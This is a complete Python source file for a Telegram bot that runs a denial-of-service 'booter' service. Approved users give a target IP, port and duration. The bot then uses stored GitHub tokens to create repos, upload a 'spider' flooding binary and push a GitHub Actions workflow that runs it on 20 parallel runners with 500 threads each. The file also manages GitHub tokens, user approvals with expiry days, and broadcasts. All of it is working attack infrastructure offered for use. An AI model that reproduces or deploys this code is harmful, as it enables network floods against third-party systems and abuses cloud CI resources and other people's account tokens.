import os
import json
import logging
import time
import uuid
import asyncio
import traceback
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}   # key: attack_id -> {ip, port, time, user_id, start_time, timer_task}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}

# ===== SAFE FILE OPS =====
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INIT =====
def init_data():
    global owners, github_tokens, approved_users, pending_users
    
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])

init_data()

# ============================================================
# ===== VALIDATION & HELPERS =====
# ============================================================

def validate_github_token(token):
    """STRICT GitHub token validation"""
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

def auto_remove_expired():
    """Auto-remove invalid/expired tokens"""
    global github_tokens
    if not github_tokens:
        return 0
    
    removed = 0
    valid = []
    
    for td in github_tokens:
        token = td.get('token')
        if not token:
            removed += 1
            continue
        
        is_valid, info = validate_github_token(token)
        if is_valid:
            td['username'] = info
            valid.append(td)
        else:
            removed += 1
            logger.warning(f"🗑️ Removed invalid token: {token[:10]}... - {info}")
    
    if removed > 0:
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        logger.info(f"✅ Auto-removed {removed} invalid tokens. Remaining: {len(github_tokens)}")
    
    return removed

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ===== ATTACK MANAGEMENT (MULTIPLE) =====
def start_attack(attack_id, ip, port, time_val, user_id):
    """Add a new attack to active_attacks and schedule auto-finish."""
    active_attacks[attack_id] = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "start_time": time.time(),
        "timer_task": None
    }
    save_json('attack_state.json', active_attacks)

def finish_attack(attack_id):
    """Remove an attack from active_attacks."""
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners can upload binary.")
            return ConversationHandler.END

        auto_remove_expired()

        if not github_tokens:
            await update.message.reply_text("❌ No valid GitHub tokens. Use /addtoken")
            return ConversationHandler.END

        await update.message.reply_text(
            "📤 **Send me the `spider` binary file**\n\n"
            "File must be named: `spider`\n"
            "Send /cancel to cancel."
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners can upload binary.")
            return ConversationHandler.END

        if not update.message.document:
            await update.message.reply_text("❌ Please send a file.")
            return WAITING_FOR_BINARY

        file = update.message.document
        if file.file_name != "spider":
            await update.message.reply_text(f"❌ File must be named `spider`. Found: `{file.file_name}`")
            return WAITING_FOR_BINARY

        auto_remove_expired()

        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens. Add with /addtoken")
            return ConversationHandler.END

        progress = await update.message.reply_text(f"📤 Uploading to {len(github_tokens)} repos...")

        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)

        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success_count = 0
        fail_count = 0
        results = []

        for token_data in github_tokens:
            token = token_data.get('token')
            repo_name = token_data.get('repo')
            username = token_data.get('username', 'unknown')

            try:
                g = Github(token)
                repo = g.get_repo(repo_name)

                try:
                    existing = repo.get_contents("spider")
                    repo.update_file("spider", "Update spider binary", content, existing.sha)
                    results.append((username, True, "✅ Updated"))
                except Exception:
                    repo.create_file("spider", "Add spider binary", content)
                    results.append((username, True, "✅ Created"))
                success_count += 1

            except Exception as e:
                results.append((username, False, f"❌ {str(e)[:40]}"))
                fail_count += 1

        msg = f"✅ **Binary Upload Complete!**\n━━━━━━━━━━━━━━━━━\n"
        msg += f"✅ Success: {success_count}\n❌ Failed: {fail_count}\n📊 Total: {len(github_tokens)}\n━━━━━━━━━━━━━━━━━\n"

        for username, success, status in results:
            emoji = "✅" if success else "❌"
            msg += f"{emoji} @{username}: {status}\n"

        await progress.edit_text(msg)
        return ConversationHandler.END

    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners can add tokens.")
            return

        if len(context.args) != 1:
            await update.message.reply_text("Usage: /addtoken <github_token>")
            return

        token = context.args[0].strip()

        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ Invalid token: {info}")
            return

        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("❌ Token already exists! Use /tokens to see list.")
                return

        g = Github(token)
        user = g.get_user()
        username = user.login

        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(
                    f"⚠️ User @{username} already has a token!\n"
                    f"Existing repo: `{t.get('repo')}`\n"
                    f"Use /removetoken first if you want to replace."
                )
                return

        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)

        try:
            repo.create_file(".github/workflows/main.yml", "Init workflow", "")
        except:
            pass

        github_tokens.append({
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat()
        })
        save_json('github_tokens.json', github_tokens)

        await update.message.reply_text(
            f"✅ **Token Added!**\n"
            f"👤 User: @{username}\n"
            f"📁 Repo: `{repo_name}`\n"
            f"📊 Total: {len(github_tokens)}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners can view tokens.")
            return

        removed = auto_remove_expired()

        if not github_tokens:
            msg = "📭 No tokens."
            if removed > 0:
                msg = f"🧹 Removed {removed} expired tokens.\n📭 No tokens remaining."
            await update.message.reply_text(msg)
            return

        msg = "📋 **GitHub Tokens**\n━━━━━━━━━━━━━━━━━\n"
        if removed > 0:
            msg += f"🧹 Removed {removed} expired tokens\n\n"

        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "..." + t['token'][-4:]
            msg += f"{i}. @{t.get('username', 'Unknown')}\n"
            msg += f"   `{token_short}`\n"
            msg += f"   📁 `{t['repo']}`\n\n"

        msg += f"📊 Total: {len(github_tokens)} valid"
        await update.message.reply_text(msg)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners can check tokens.")
            return

        if not github_tokens:
            await update.message.reply_text("📭 No tokens to check.")
            return

        removed = auto_remove_expired()

        msg = "🔍 **Token Status**\n━━━━━━━━━━━━━━━━━\n"
        msg += f"📊 Total: {len(github_tokens)}\n"
        msg += f"🧹 Expired removed: {removed}\n\n"

        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "..." + t['token'][-4:]
            msg += f"{i}. @{t.get('username', 'Unknown')}\n"
            msg += f"   `{token_short}` ✅ Valid\n\n"

        await update.message.reply_text(msg)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners can remove tokens.")
            return

        if len(context.args) != 1:
            await update.message.reply_text("Usage: /removetoken <token>")
            return

        token = context.args[0]
        found = False
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                found = True
                break

        if found:
            await update.message.reply_text(f"✅ Token removed. Remaining: {len(github_tokens)}")
        else:
            await update.message.reply_text("❌ Token not found.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners can clear tokens.")
            return

        if not github_tokens:
            await update.message.reply_text("📭 No tokens.")
            return

        count = len(github_tokens)
        if len(context.args) == 1 and context.args[0].lower() == "confirm":
            github_tokens.clear()
            save_json('github_tokens.json', github_tokens)
            await update.message.reply_text(f"🗑️ Cleared {count} tokens.")
        else:
            await update.message.reply_text(f"⚠️ Delete ALL {count} tokens? Use `/cleartokens confirm`")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== ATTACK COMMAND (POWER BOOST: 20 RUNNERS + 500 THREADS) =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id

        if not can_attack(user_id):
            await update.message.reply_text("❌ No permission.")
            return

        if len(context.args) != 3:
            await update.message.reply_text("Usage: /attack <ip> <port> <time>")
            return

        ip, port_str, time_str = context.args
        try:
            port = int(port_str)
            time_val = int(time_str)
        except:
            await update.message.reply_text("❌ Port and time must be numbers.")
            return

        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ Port must be 1-65535.")
            return

        if time_val < 5 or time_val > 3600:
            await update.message.reply_text("❌ Time must be 5-3600 seconds.")
            return

        # Remove invalid tokens
        auto_remove_expired()

        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens. Use /addtoken")
            return

        # Generate unique attack ID
        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"

        # Pick first valid token
        valid_token = github_tokens[0]

        g = Github(valid_token['token'])
        repo = g.get_repo(valid_token['repo'])

        # Check binary exists
        try:
            repo.get_contents("spider")
        except:
            await update.message.reply_text("❌ Binary 'spider' not found. Upload with /binary_upload")
            return

        # ============================================================
        # 🚀 POWER BOOST: 20 PARALLEL RUNNERS + 500 THREADS PER RUNNER
        # ============================================================
        yml_content = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {time_val} 500
"""
        try:
            file = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
        except:
            try:
                repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
            except:
                repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

        # Add to active attacks
        start_attack(attack_id, ip, port, time_val, user_id)

        # Schedule auto-removal after attack time + buffer (10s)
        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
            logger.info(f"✅ Auto-finished attack {attack_id}")
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task

        await update.message.reply_text(
            f"✅ **Attack Started!**\n"
            f"🎯 {ip}:{port}\n"
            f"⏱️ {time_val}s\n"
            f"⚡ **20 Parallel Runners** (500 threads each)\n"
            f"📁 {valid_token['repo']}\n"
            f"🆔 `{attack_id}`"
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Attack failed: {str(e)[:200]}")

# ============================================================
# ===== OTHER COMMANDS =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"

        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("⚡ Attack", callback_data="attack_help")],
                [InlineKeyboardButton("📊 Status", callback_data="status")],
                [InlineKeyboardButton("🛑 Stop", callback_data="stop")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("🔧 Admin", callback_data="admin_panel")])

            await update.message.reply_text(
                f"🔥 **Bot Active**\n👤 @{username}\n🎯 {'👑 Owner' if is_owner(user_id) else '✅ Approved'}\n\nUse /attack <ip> <port> <time>",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                save_json('pending_users.json', pending_users)
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(int(owner_id), f"📥 Request from @{username}\nID: `{user_id}`\n/approve {user_id} 7")
                    except:
                        pass
            await update.message.reply_text("❌ Access Denied. Request sent to owner.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("❌ No access")
            return

        if not active_attacks:
            await update.message.reply_text("✅ No attack running.")
            return

        msg = "🔥 **Active Attacks**\n━━━━━━━━━━━━━━━━━\n"
        for aid, data in active_attacks.items():
            elapsed = int(time.time() - data['start_time'])
            remaining = data['time'] - elapsed
            if remaining < 0:
                remaining = 0
            msg += f"🎯 {data['ip']}:{data['port']}\n"
            msg += f"⏱️ {elapsed}s elapsed, {remaining}s remaining\n"
            msg += f"🆔 `{aid}`\n\n"
        await update.message.reply_text(msg)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("❌ No access")
            return

        if not active_attacks:
            await update.message.reply_text("✅ No attack running.")
            return

        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(f"🛑 Stopped {count} attack(s).")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Commands**\n"
        "/start - Menu\n/attack <ip> <port> <time>\n/status\n/stop\n/help\n/myid\n\n"
        "**Admin:**\n/addtoken <token>\n/removetoken <token>\n/checktokens\n/cleartokens\n/tokens\n/binary_upload\n/approve <id> <days>\n/remove <id>\n/users\n/pending\n/broadcast <msg>"
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 ID: `{update.effective_user.id}`")

# ============================================================
# ===== ADMIN USER COMMANDS =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners.")
            return
        if len(context.args) != 2:
            await update.message.reply_text("Usage: /approve <user_id> <days>")
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "expiry": expiry, "days": days}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"✅ User `{target_id}` approved for {days} days.")
        try:
            await context.bot.send_message(target_id, "✅ Access Granted! Use /start")
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners.")
            return
        if len(context.args) != 1:
            await update.message.reply_text("Usage: /remove <user_id>")
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} removed.")
        else:
            await update.message.reply_text("❌ User not found.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners.")
            return
        if not approved_users:
            await update.message.reply_text("📭 No users.")
            return
        msg = "👤 **Users**\n━━━━━━━━━━━━━━━━━\n"
        for uid, data in approved_users.items():
            msg += f"`{uid}` - {data.get('days', '?')}d\n"
        await update.message.reply_text(msg)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners.")
            return
        if not pending_users:
            await update.message.reply_text("📭 No pending.")
            return
        msg = "⏳ **Pending**\n━━━━━━━━━━━━━━━━━\n"
        for u in pending_users:
            msg += f"`{u.get('user_id')}` - @{u.get('username')}\n"
        await update.message.reply_text(msg)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /broadcast <msg>")
            return
        msg = " ".join(context.args)
        sent = 0
        for uid in list(owners.keys()) + list(approved_users.keys()):
            try:
                await context.bot.send_message(int(uid), f"📢 {msg}")
                sent += 1
            except:
                pass
        await update.message.reply_text(f"✅ Sent to {sent} users.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("❌ Only owners.")
            return
        if len(context.args) != 1:
            await update.message.reply_text("Usage: /maintenance <on/off>")
            return
        mode = context.args[0].lower()
        save_json('maintenance.json', {"maintenance": mode == "on"})
        await update.message.reply_text(f"🔧 Maintenance {'ENABLED' if mode == 'on' else 'DISABLED'}.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        if data == "attack_help":
            await query.edit_message_text("⚡ Use: /attack <ip> <port> <time>")
        elif data == "status":
            await status_cmd(update, context)
        elif data == "stop":
            await stop_cmd(update, context)
        elif data == "admin_panel" and is_owner(user_id):
            keyboard = [
                [InlineKeyboardButton("📋 Tokens", callback_data="admin_tokens")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
                [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
                [InlineKeyboardButton("🧹 Check Tokens", callback_data="admin_checktokens")],
            ]
            await query.edit_message_text("🔧 **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard))
        elif data == "admin_tokens":
            await tokens_cmd(update, context)
        elif data == "admin_users":
            await users_cmd(update, context)
        elif data == "admin_pending":
            await pending_cmd(update, context)
        elif data == "admin_binary":
            await query.edit_message_text("📤 Use: /binary_upload")
        elif data == "admin_checktokens":
            await checktokens_cmd(update, context)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================
# ===== ERROR =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ Error occurred. Check logs.")
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("binary_upload", binary_upload_start)],
            states={WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, binary_upload_receive), CommandHandler("cancel", binary_upload_cancel)]},
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv_handler)

        app.add_handler(CommandHandler("start", start_cmd))
        app.add_handler(CommandHandler("attack", attack_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("stop", stop_cmd))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))

        app.add_handler(CommandHandler("addtoken", addtoken_cmd))
        app.add_handler(CommandHandler("removetoken", removetoken_cmd))
        app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
        app.add_handler(CommandHandler("checktokens", checktokens_cmd))
        app.add_handler(CommandHandler("tokens", tokens_cmd))
        app.add_handler(CommandHandler("approve", approve_cmd))
        app.add_handler(CommandHandler("remove", removeuser_cmd))
        app.add_handler(CommandHandler("users", users_cmd))
        app.add_handler(CommandHandler("pending", pending_cmd))
        app.add_handler(CommandHandler("broadcast", broadcast_cmd))
        app.add_handler(CommandHandler("maintenance", maintenance_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("🚀 Bot is running with ULTIMATE POWER (20 runners, 500 threads)!")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
